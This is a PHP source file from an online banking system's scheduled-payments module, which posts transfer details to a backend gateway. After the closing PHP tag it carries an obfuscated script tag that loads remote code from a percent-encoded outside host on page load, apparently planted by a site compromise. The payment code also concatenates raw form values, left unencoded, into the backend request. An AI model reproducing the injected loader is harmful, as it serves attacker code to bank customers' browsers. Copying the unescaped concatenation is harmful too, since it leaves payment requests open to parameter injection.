<script type="text/javascript">
	$( document).ready(function(){
		$("#boHelpDao").hide();		
	});
</script>
<?php
//
//
// Created on: <1-Nov-2001 17:37:53 smb>
//
// This source file is part of IVA.
//
// Copyright (C) 1997-2004 Internet de Alta Calidad, S.A. de C.V.  Todos los derechos reservados. All rights reserved.
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, US
//
include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );


//ATAR Agregar Calendario en Agenda de Pagos 24-Nov-2010
include("eztransaccion/user/include/jscalendar/calendar-blue.css");
// JAC MAR2012 - CORRECCION MODULO DE CREDITOS INI
include("eztransaccion/user/include/jscalendar/calendar.js"); // MAOS 05dic2012 track 241546  Para que muestre el calendario
/*
if($session->variable("calendario")==0)
{
	include("eztransaccion/user/include/jscalendar/calendar.js");
}
*/
$session->setVariable("calendario",$session->variable("calendario")+1);
// JAC MAR2012 - CORRECCION MODULO DE CREDITOS FIN
include("eztransaccion/user/include/js/FuncionesReimpresion.js");
//ATAR Agregar Calendario en Agenda de Pagos 24-Nov-2010

$session =& eZSession::globalSession();

if( !$session->fetch() )
    $session->store();

$ini =& $GLOBALS["GlobalSiteIni"];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
// $backend = $ini->read_var( "eZTransaccionMain", "Backend" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );

$backend = "gw" . $ServerNumber. $DomainPostfix;

include_once( "ezuserbb/classes/ezuser.php" );

$user =& eZUserBB::currentUser();

// DebugBreak();

if ( $user )
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "PagosProgramados.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "pagosprogramados_tpl" => "PagosProgramados.tpl"
        ) );


    $session =& eZSession::globalSession();

    if ( !$session->fetch() )
    {
        $session->store();
    }

    $tr = new eZTransaccion( );
    $usr = $session->variable( "r_usr" );
    $qki = $session->variable( "r_qki" );
    $priv = $session->variable( "r_priv" );
    $transaccion_buffer = "";
//HB
	if(!empty($_POST['Cust']))
		$Cust = $_POST['Cust'];
		
	if(!empty($_POST['Cuenta']))
		$Cuenta = $_POST['Cuenta'];
		
	if(!empty($_POST['Sub']))
		$Sub = $_POST['Sub'];
//HB
    if(empty($_POST['Access'])) {
        $_POST['Access'] = "FrAc";
    }
    if(empty($_POST['Accion'])) {
        $_POST['Accion'] = "Listaapp";
    }
	if($_POST['Listado']=="Cancelar")
	{
		$_POST['Accion'] = "Listaapp";
	}

    switch($_POST['Access']) {
    case "FrAc":
        $particularFields = "&Accion=".urlencode($_POST['Accion'])."&Pos=".urlencode($Pos);
        $tr->blog($qki,"Pagos Programados", $_POST['FrAccount'], $Cust, $Cuenta, $Sub, $_POST['Accion']);
        break;
    case "Confirm":
                if($_POST['Newapp']=="Altas")
                {
                        $_POST['Accion'] = "Newapp";
                        $_POST['Access'] = "FrAc";
                }
                if($_POST['Canccta']=="Bajas")
                {
                        $_POST['Accion'] = "Cancapp";
                }
        switch($_POST['Access'])
        {
                case "FrAc":
                                $particularFields = "&Accion=".urlencode($_POST['Accion']).
                                "&Pos=".urlencode($Pos).
                                "&Rownos=".$_POST['Borrar0'].$_POST['Borrar1'].$_POST['Borrar2'].$_POST['Borrar3'];
                                $tr->blog($qki,"Pagos Programados", $_POST['FrAccount'], $Cust, $Cuenta, $Sub, $_POST['Accion']);
                                break;
                        case "Confirm":
                                if ($_POST['Accion'] == "Newapp")
                                {
									// RAI 07Junio2011 - Inicio - Pagos periódicos
									if ($_POST['Day'] == "" or $_POST['Day'] == " ")
										$_POST['Day'] = "01";
									
									if ($_POST['Month'] == "" or $_POST['Month'] == " ")
										$_POST['Month'] = "01";
										
									if ($_POST['Year'] == "" or $_POST['Year'] == " ")
										$_POST['Year'] = "2011";
										
									/*$particularFields = "&Accion=".urlencode($_POST['Accion']).
									"&Button=".urlencode($_POST['Button']).
									"&FrAccount=".urlencode($_POST['FrAccount']).
									"&ToAccount=".urlencode($_POST['ToAccount']).
									"&ImpEnvio=".urlencode($_POST['ImpEnvio']).
									"&Amount=".urlencode($_POST['Amount']).
									"&RenInt=".urlencode($RenInt).
									"&Desc=".urlencode($_POST['Desc']).
									"&Editar=".urlencode($_POST['Editar']).
									"&Day=".urlencode($_POST['Day']).
									"&Month=".urlencode($_POST['Month']).
									"&Year=".urlencode($_POST['Year']).
									"&Cq=".urlencode($_POST['Cq']).
									"&Porcen1=".urlencode($_POST['Porcen1']).
									"&DiasPzo=".urlencode($_POST['DiasPzo']).
									"&DayF=".urlencode($_POST['DayF']).
									"&MonthF=".urlencode($_POST['MonthF']); */
									
									$particularFields = "&Accion=".$_POST['Accion'].
									"&Button=".$_POST['Button'].
									"&FrAccount=".$_POST['FrAccount'].
									"&ToAccount=".$_POST['ToAccount'].
									"&ImpEnvio=".$_POST['ImpEnvio'].
									"&Amount=".$_POST['Amount'].
									"&RenInt=".$RenInt.
									"&Desc=".$_POST['Desc'].
									"&Editar=".$_POST['Editar'].
									"&Day=".$_POST['Day'].
									"&Month=".$_POST['Month'].
									"&Year=".$_POST['Year'].
									"&Cq=".$_POST['Cq'].
									"&Porcen1=".$_POST['Porcen1'].
									"&DiasPzo=".$_POST['DiasPzo'].
									"&DayF=".$_POST['DayF'].
									"&MonthF=".$_POST['MonthF'];
									
									// RAI 07Junio2011 - Fin - Pagos periódicos
                                }
                                else
                                {
                                        $Rownos = "";
                                        if ($_POST['Borrar0'] <> "") { $Rownos = $Rownos.$_POST['Borrar0']."-"; }
                                        if ($_POST['Borrar1'] <> "") { $Rownos = $Rownos.$_POST['Borrar1']."-"; }
                                        if ($_POST['Borrar2'] <> "") { $Rownos = $Rownos.$_POST['Borrar2']."-"; }
                                        if ($_POST['Borrar3'] <> "") { $Rownos = $Rownos.$_POST['Borrar3']."-"; }
                                        if ($_POST['Borrar4'] <> "") { $Rownos = $Rownos.$_POST['Borrar4']."-"; }
                                        if ($_POST['Borrar5'] <> "") { $Rownos = $Rownos.$_POST['Borrar5']."-"; }
                                        if ($_POST['Borrar6'] <> "") { $Rownos = $Rownos.$_POST['Borrar6']."-"; }
                                        if ($_POST['Borrar7'] <> "") { $Rownos = $Rownos.$_POST['Borrar7']."-"; }
                                        if ($_POST['Borrar8'] <> "") { $Rownos = $Rownos.$_POST['Borrar8']."-"; }
                                        if ($_POST['Borrar9'] <> "") { $Rownos = $Rownos.$_POST['Borrar9']."-"; }
                                        $particularFields = "&Accion=".urlencode($_POST['Accion']).
                                        "&Button=".urlencode($_POST['Button'])."&Pos=".urlencode($Pos).
                                        "&Desc=".urlencode($Rownos);
                                }
                        $tr->blog($qki,"Pagos Programados", $_POST['FrAccount'], $_POST['ToAccount'], $_POST['Amount'], $_POST['ImpEnvio'], $_POST['Accion']);
                                break;
                }
                break;
    case "Process":
		//AGG 15JUL2006 SE CAMBIA EL NOMBRE DEL BOTON
		if($_POST['Listado']=="Cambiar") 
		{
			$_POST['Accion'] = "Listaapp";
		}
		//AGG 15JUL2006 SE CAMBIA EL NOMBRE DEL BOTON
        if($_POST['Listado']=="Consultas")
        {
            $_POST['Accion'] = "Listaapp";
        }
        switch($_POST['Accion'])
        {
                        case "Newapp":
							// RAI 07Junio2011 - Inicio - Pagos periódicos
							/* $particularFields = "&Passwd=".encrypt( $_POST['code'], strtolower( $usr ) ).	//ALUNA 30Jul2007 agenda de pagos tokens
							"&Accion=".urlencode($_POST['Accion']).
							"&Button=".urlencode($_POST['Button']).
							"&FrAccount=".urlencode($_POST['FrAccount']).
							"&ToAccount=".urlencode($_POST['ToAccount']).
							"&ImpEnvio=".urlencode($_POST['ImpEnvio']).
							"&Amount=".urlencode($_POST['Amount']).
							"&RenInt=".urlencode($RenInt).
							"&Desc=".urlencode($_POST['Desc']).
							"&Editar=".urlencode($_POST['Editar']).
							"&Day=".urlencode($_POST['Day']).
							"&Month=".urlencode($_POST['Month']).
							"&Year=".urlencode($_POST['Year']).
							"&Cq=".urlencode($_POST['Cq']).
							"&Porcen1=".urlencode($_POST['Porcen1']).
							"&DiasPzo=".urlencode($_POST['DiasPzo']).
							"&DayF=".urlencode($_POST['DayF']).
							"&MonthF=".urlencode($_POST['MonthF']); */
							
							$particularFields = "&Passwd=".encrypt( $_POST['code'], strtolower( $usr ) ).	//ALUNA 30Jul2007 agenda de pagos tokens
							"&Accion=".$_POST['Accion'].
							"&Button=".$_POST['Button'].
							"&FrAccount=".$_POST['FrAccount'].
							"&ToAccount=".$_POST['ToAccount'].
							"&ImpEnvio=".$_POST['ImpEnvio'].
							"&Amount=".$_POST['Amount'].
							"&RenInt=".$RenInt.
							"&Desc=".$_POST['Desc'].
							"&Editar=".$_POST['Editar'].
							"&Day=".$_POST['Day'].
							"&Month=".$_POST['Month'].
							"&Year=".$_POST['Year'].
							"&Cq=".$_POST['Cq'].
							"&Porcen1=".$_POST['Porcen1'].
							"&DiasPzo=".$_POST['DiasPzo'].
							"&DayF=".$_POST['DayF'].
							"&MonthF=".$_POST['MonthF'];
							
							// RAI 07Junio2011 - Fin - Pagos periódicos
							
							$tr->blog($qki,"Pagos Programados", $_POST['FrAccount'], $_POST['ToAccount'], $_POST['Amount'], $_POST['ImpEnvio'], $_POST['Accion']);
							break;
                        case "Cancapp":
                                $particularFields = "&Cust=".urlencode($Cust)."&Accion=".urlencode($_POST['Accion']).
                                "&Button=".urlencode($_POST['Button'])."&Desc=".urlencode($_POST['Desc']);
                                $tr->blog($qki,"Catalogo de Cuentas", $_POST['FrAccount'], $Cust, $Cuenta, $Sub, $_POST['Accion']);

                                break;
                        default:
                                $particularFields = "&Cust=".urlencode($Cust)."&Accion=".urlencode($_POST['Accion']).
                                "&Button=".urlencode($_POST['Button']);
                                $tr->blog($qki,"Catalogo de Cuentas", $_POST['FrAccount'], $Cust, $Cuenta, $Sub, $_POST['Accion']);
                }


        break;
    }
    $transaccion_buffer = "";
    // DebugBreak();
    $ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=app&Access=".urlencode($_POST['Access'])."&CustID=".urlencode($usr)."&Cadpriv=".urlencode($priv).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer);
	$transaccion_buffer = str_replace("SIZE=\"20\" MAXVALUE=\"60\" onFocus=\"this.value=WithOutFormatAmount(this.value);focus();select();\"", "SIZE=\"17\" MAXLENGTH=\"17\" id=\"Amount\" onKeyUp=\"currencya( this,event );\"", $transaccion_buffer); //MAOS OCT2013 Formato de moneda en linea
	$transaccion_buffer = str_replace("SIZE=\"10\" MAXVALUE=\"10\" onFocus=\"this.value=WithOutFormatAmount(this.value);focus();select();\"", "SIZE=\"17\" MAXLENGTH=\"17\" id=\"RenInt\" onKeyUp=\"currencyi( this,event );\"", $transaccion_buffer); //MAOS OCT2013 Formato de moneda en linea

    $t->set_var( "transaccion_buffer", $transaccion_buffer );
    $t->pparse( "output", "pagosprogramados_tpl" );
}
else
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "userlogin.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "user_login_tpl" => "userlogin.tpl"
        ) );

    $t->set_var( "redirect_url", "/transaccion/PagosProgramados/" );

    $t->pparse( "output", "user_login_tpl" );
}
?>

<script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>